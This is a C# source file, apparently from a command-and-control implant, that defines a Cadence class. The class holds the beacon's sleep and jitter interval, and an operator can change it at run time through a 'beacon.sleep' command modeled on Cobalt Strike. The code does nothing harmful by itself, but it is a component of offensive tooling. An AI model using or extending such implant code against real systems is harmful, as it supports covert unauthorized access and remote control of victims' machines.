namespace Rod.Implant.Internal;

// The live check-in cadence: the sleep/jitter pair the artifact was baked
// with, held mutable so a fielded implant can be retuned at run time through
// the beacon.sleep verb (Cobalt Strike's sleep) -- including 0/0, the
// interactive-as-poll posture where the implant checks in back-to-back.
//
// One instance is shared by everything with an opinion about the cadence:
// both check-in clients read it at the top of every cycle (a change lands on
// the very next sleep, never mid-cycle), and the beacon.sleep handler is the
// only writer. Reference swap of an immutable pair, so a reader torn between
// two Set calls still sees one coherent (sleep, jitter) pair.

/// <summary>
/// The mutable check-in cadence shared by the check-in clients and the
/// beacon.sleep handler. Reads are lock-free snapshots; writes replace the
/// whole pair.
/// </summary>
internal sealed class Cadence
{
    // The immutable pair a read snapshots: the base sleep and the jitter
    // half-width the cycle applies around it.
    private sealed record Values(TimeSpan Sleep, TimeSpan Jitter);

    private Values _current;

    public Cadence(TimeSpan sleep, TimeSpan jitter) => _current = new Values(sleep, jitter);

    /// <summary>The cadence the next cycle sleeps on.</summary>
    public (TimeSpan Sleep, TimeSpan Jitter) Current => (_current.Sleep, _current.Jitter);

    /// <summary>
    /// Replaces the cadence and returns the pair it replaced, so the handler
    /// can report "was X, now Y" -- the operator's confirmation the change
    /// landed on the value they meant.
    /// </summary>
    public (TimeSpan Sleep, TimeSpan Jitter) Set(TimeSpan sleep, TimeSpan jitter)
    {
        var prior = _current;
        _current = new Values(sleep, jitter);
        return (prior.Sleep, prior.Jitter);
    }
}
